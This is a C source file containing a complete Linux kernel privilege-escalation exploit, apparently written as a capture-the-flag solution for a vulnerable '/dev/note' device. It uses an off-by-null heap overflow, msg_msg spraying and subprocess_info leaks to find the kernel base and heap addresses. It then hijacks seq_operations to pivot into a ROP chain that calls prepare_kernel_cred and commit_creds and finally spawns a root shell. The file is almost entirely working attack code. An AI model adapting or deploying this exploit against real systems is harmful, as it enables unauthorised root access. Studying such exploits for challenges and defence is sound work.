#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#define CMD_ALLOC  0xc12ed001
#define CMD_DELETE 0xc12ed002
#define CMD_STORE  0xc12ed003
#define CMD_LOAD   0xc12ed004

unsigned long kbase, kheap;
unsigned long call_usermodehelper_exec_work = 0x060160;
unsigned long commit_creds = 0x069c10;
unsigned long prepare_kernel_cred = 0x069e00;
unsigned long run_cmd = 0x06a180;
unsigned long msleep = 0x09a950;
unsigned long rop_mov_esp_5d000010 = 0x02cae0;
unsigned long rop_pop_rcx = 0x0368fa;
unsigned long rop_pop_rax = 0x005de4;
unsigned long rop_pop_rdi_dec_ecx = 0x038bf9;
unsigned long rop_mov_rdi_rax_pop_rbp = 0x01877f;
unsigned long rop_mov_prax_rdi_pop_rbp = 0x0eaea1;
unsigned long rop_swapgs_pop_rbp = 0x03ef24;
unsigned long rop_iretq = 0x01d5c6;
int fd;

struct {
  int size;
  char *note;
} cmd;

int new(int size) {
  cmd.size = size;
  cmd.note = NULL;
  return ioctl(fd, CMD_ALLOC, (void*)&cmd);
}

int delete() {
  cmd.size = 0;
  cmd.note = NULL;
  return ioctl(fd, CMD_DELETE, (void*)&cmd);
}

int store(int size, char *note) {
  cmd.size = size;
  cmd.note = note;
  return ioctl(fd, CMD_STORE, (void*)&cmd);
}

int load(int size, char *note) {
  cmd.size = size;
  cmd.note = note;
  return ioctl(fd, CMD_LOAD, (void*)&cmd);
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :: "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
  puts("[-] bye!");
  exit(0);
}

struct {
  long mtype;
  char mtext[0x80];
} msgbuf;

/* entry point */
int main(void) {
  unsigned long buf[0x80];
  memset(buf, 'X', 0x80);
  save_state();
  char *command = malloc(0x80);
  strcpy(command, "/bin/chmod 777 /flag");
  fd = open("/dev/note", O_RDWR);
  if (fd < 0) {
    perror("/dev/note");
    return 1;
  }

  /* spray for kmalloc-128 */
  int qid;
  if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
    perror("msgget");
    return -1;
  }

  msgbuf.mtype = 1;
  memset(msgbuf.mtext, 'A', sizeof(msgbuf.mtext));
  //for(int i = 0; i < 0x20; i++) {
  for(int i = 0; i < 0x21; i++) {
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) {
      perror("msgsnd");
      return -1;
    }
  }

  /* kbase leak */
  new(0x80);
  store(0x80, (void*)buf); // off-by-null
  delete();
  if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) return 1;
  new(0x80);
  socket(22, AF_INET, 0); // subprocess_info
  load(0x80, (void*)buf);
  kbase = buf[3] - call_usermodehelper_exec_work;
  printf("[+] kbase = 0x%016lx\n", kbase);
  /* prepare rop chain */
  unsigned long *chain = (unsigned long*)
    mmap((void*)(0x5d000000 - 0x8000),
         0x10000,
         PROT_READ | PROT_WRITE,
         0x20 | MAP_ANON | MAP_SHARED | MAP_POPULATE,
         -1, 0);
  if ((unsigned long)chain != 0x5d000000 - 0x8000) {
    perror("mmap");
    return 1;
  }

  chain += 0x8010 / sizeof(unsigned long);
  *chain++ = kbase + rop_pop_rdi_dec_ecx;
  *chain++ = 0;
  *chain++ = kbase + prepare_kernel_cred;
  *chain++ = kbase + rop_pop_rcx;
  *chain++ = 0;
  *chain++ = kbase + rop_mov_rdi_rax_pop_rbp;
  *chain++ = 0xdeadbeefcafebabe;
  *chain++ = kbase + commit_creds;
  *chain++ = kbase + rop_swapgs_pop_rbp;
  *chain++ = 0xdeadbeefcafebabe;
  *chain++ = kbase + rop_iretq;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = 0x5d000000;
  *chain++ = user_ss;

  /* consume freelist */
  delete();
  for(int i = 0; i < 3; i++) {
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) return 1;
  }

  memset(buf, 'X', 0x80);

  /* kheap leak */
  new(0x80);
  store(0x80, (void*)buf); // off-by-null
  delete();
  if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) return 1;
  new(0x80);
  if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) return 1;
  load(0x80, (void*)buf);
  kheap = buf[1];// + 0x80;
  printf("[+] kheap = 0x%016lx\n", kheap);
  if (kheap == 0x80) {
    puts("[-] Bad luck...");
    return 1;
  }

  /* align for kmalloc-32 */
  //for(int i = 0; i < 0x84; i++) { // adjust it in range of 0x80-0x88
  for(int i = 0; i < 0x83; i++) { // remote
    open("/proc/self/stat", O_RDONLY);
  }

  /* chunk overlap */
  delete();
  new(0x20);
  buf[0] = kheap; // valid fd
  store(0x20, (void*)buf); // off-by-null
  open("/proc/self/stat", O_RDONLY);
  int victim = open("/proc/self/stat", O_RDONLY); // overlap!
  /* abuse seq_operations */
  buf[0] = kbase + rop_mov_esp_5d000010; // start
  store(0x20, (void*)buf);

  /* ignite! */
  read(victim, buf, 1); // seq_read
  return 0;
}
